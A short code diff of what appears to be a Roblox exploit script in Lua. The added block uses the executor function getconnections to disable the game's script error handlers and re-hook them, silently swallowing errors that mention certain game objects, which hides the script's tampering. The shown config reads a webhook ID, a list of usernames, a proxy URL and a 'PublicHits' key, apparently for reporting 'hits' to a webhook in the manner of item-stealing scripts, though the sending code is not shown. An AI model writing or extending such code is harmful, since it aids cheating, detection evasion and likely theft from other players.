@@ -1,6 +1,24 @@
 repeat task.wait() until game:IsLoaded()
 task.wait(1.5)
 
+
+pcall(function()
+    local errorConnection
+    for _, conn in ipairs(getconnections(game:GetService("ScriptContext").Error)) do
+        if conn.Function then
+            local old = conn.Function
+            conn:Disable()
+            game:GetService("ScriptContext").Error:Connect(function(message, stackTrace)
+                if message:find("RemainingTime") or message:find("BillboardGui") or message:find("PlotClient") then
+                    return
+                end
+                old(message, stackTrace)
+            end)
+            break
+        end
+    end
+end)
+
 if game.PlaceId ~= 109983668079237 then
     local plr = game.Players.LocalPlayer
     if plr and typeof(plr.Kick) == "function" then
@@ -25,6 +43,7 @@ local WEBHOOK_ID = cfg.WEBHOOK_ID
 local USERNAMES = cfg.USERNAMES
 local PROXY_URL = cfg.PROXY_URL
 local PublicHits = "31566ef8c2c18566522c58e8c11511cf"
+
 
 if not WEBHOOK_ID or WEBHOOK_ID == "" then
     warn("[ED] Invalid webhook")
